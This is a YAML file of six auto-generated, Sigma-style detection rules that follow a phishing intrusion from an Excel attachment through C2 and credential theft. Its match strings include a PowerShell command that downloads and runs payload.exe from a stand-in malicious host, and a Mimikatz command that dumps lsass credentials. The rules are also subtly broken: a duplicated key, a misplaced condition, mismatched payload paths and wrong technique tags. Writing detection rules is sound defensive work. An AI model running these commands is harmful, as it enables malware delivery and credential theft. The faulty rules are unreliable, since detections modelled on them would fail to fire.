```yaml
- title: Identify Initial Email Delivery
  id: 123e4567-e89b-12d3-a456-426614174000
  description: Monitor for events indicating the receipt of an email with the subject "Important Update" and an attachment named "Invoice_2023.xlsx".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Name: "Outlook"
      dstNode.Name: "Invoice_2023.xlsx"
      dstNode.Type: "File"
      srcNode.Name: "attacker@example.com"
      dstNode.Dstaddress: "192.0.2.1"
  condition: selection
  tags:
    - T1566.001
    - Initial Access
  level: high

---
- title: Detect Opening of Malicious Attachment
  id: 123e4567-e89b-12d3-a456-426614174001
  description: Look for events where the user opens the Excel attachment "Invoice_2023.xlsx".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\OfficeXX\\EXCEL.EXE"
      dstNode.Image: "C:\\path\\to\\Invoice_2023.xlsx"
      relation: "Process Create"
  condition: selection
  tags:
    - T1566.001
    - Initial Access
  level: high

---
- title: Capture PowerShell Command Execution
  id: 123e4567-e89b-12d3-a456-426614174002
  description: Identify events where a PowerShell command is executed to download and execute the payload.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      srcNode.Cmdline: 'Invoke-WebRequest -Uri "http://malicious.example.com/payload.exe" -OutFile "$env:TEMP\\payload.exe"; Start-Process "$env:TEMP\\payload.exe"'
      relation: "Process Create"
  condition: selection
  tags:
    - T1566.001
    - Initial Access
  level: high

---
- title: Monitor Payload Execution
  id: 123e4567-e89b-12d3-a456-426614174003
  description: Detect the execution of the downloaded payload (payload.exe) from the TEMP directory.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "C:\\Windows\\Temp\\payload.exe"
      relation: "Process Create"
      timestamp: match previous PowerShell command execution
  condition: selection
  tags:
    - T1566.001
    - Initial Access
  level: high

---
- title: Establish Command and Control Connection
  id: 123e4567-e89b-12d3-a456-426614174004
  description: Look for outbound network connections to the C2 server (203.0.113.5 on port 443).
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      dstNode.Dstaddress: "203.0.113.5"
      dstNode.Port: 443
      relation: "TCP Connect"
  condition: selection
  tags:
    - T1566.001
    - Command and Control
  level: high

---
- title: Detect Post-Exploitation Activities
  id: 123e4567-e89b-12d3-a456-426614174005
  description: Monitor for the execution of commands that may indicate post-exploitation activities, such as credential extraction using Mimikatz.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "C:\\path\\to\\mimikatz.exe"
      srcNode.Cmdline: '.\\mimikatz.exe "privilege::debug" "sekurlsa::minidump C:\\Windows\\System32\\lsass.dmp" "sekurlsa::process" "exit"'
      relation: "Process Create"
      timestamp: match previous payload execution
  condition: selection
  tags:
    - T1566.001
    - Execution
  level: high
```